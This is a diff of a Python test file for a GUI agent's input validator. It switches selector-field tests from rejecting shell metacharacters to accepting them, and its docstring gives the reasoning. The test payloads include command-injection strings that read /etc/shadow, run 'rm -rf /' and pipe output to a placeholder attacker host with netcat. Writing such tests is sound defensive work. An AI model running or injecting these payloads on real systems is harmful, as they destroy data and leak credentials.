@@ -9,15 +9,40 @@ from gui_agent.protocol import validate_gui_params
 
 
 class TestMetacharInSelectors:
+    """F-101.1 (2026-07-28): shell metachars in GUI selector fields
+    (window/role/name) are now ACCEPTED because AT-SPI queries are
+    D-Bus lookups, never shell exec. The previous strict pattern broke
+    legitimate real-world strings like "OC | System uptime check"
+    (opencode session titles) and menu items with `&`. C0 control
+    characters remain rejected (would corrupt terminal or trigger
+    unexpected keystrokes).
+
+    The safety story for these fields is: mcpd + gui_worker call
+    AT-SPI via D-Bus (no shell interpolation), pyatspi's own
+    ATSpiAccessible lookups treat these as opaque strings, and
+    downstream terminal rendering goes through _sanitize_gui_string
+    which strips ANSI + control chars (see TestAnsiInWindowTitles
+    below — those tests are unchanged + still pass).
+    """
+
     @pytest.mark.parametrize("field", ["window", "role", "name"])
     @pytest.mark.parametrize("payload", [
         "$(cat /etc/shadow)",
         "; rm -rf /",
         "| nc attacker.com 4444",
         "`whoami`",
-        "foo\x00bar",
     ])
-    def test_metachar_rejected_in_all_selector_fields(self, field, payload):
+    def test_shell_metachar_now_accepted_in_all_selector_fields(self, field, payload):
+        # No exception — F-101.1. Payload passes schema validation;
+        # actual execution goes through D-Bus AT-SPI which won't
+        # interpolate any of these.
+        params = {"window": "safe", "role": "button", "name": "OK"}
+        params[field] = payload
+        validate_gui_params("gui.click", params)
+
+    @pytest.mark.parametrize("field", ["window", "role", "name"])
+    @pytest.mark.parametrize("payload", ["foo\x00bar", "line\ninjection", "cr\rinject"])
+    def test_control_char_still_rejected_in_all_selector_fields(self, field, payload):
         params = {"window": "safe", "role": "button", "name": "OK"}
         params[field] = payload
         with pytest.raises(Exception):
